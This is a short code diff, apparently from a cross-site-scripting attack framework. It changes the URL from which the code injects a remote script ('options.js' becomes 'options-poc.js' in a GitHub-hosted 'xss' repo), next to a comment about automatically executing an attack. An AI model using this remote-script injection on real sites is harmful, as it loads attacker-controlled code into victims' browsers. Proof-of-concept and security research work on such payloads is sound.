@@ -95,7 +95,7 @@ window.JRSelect = s;
 
 // Include options.js:
 var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/gh/JacobRiggs/xss@main/options.js";
+script.src = "https://cdn.jsdelivr.net/gh/JacobRiggs/xss@main/options-poc.js";
 document.body.appendChild(script);
 
 // Automatically execute an attack if desired.
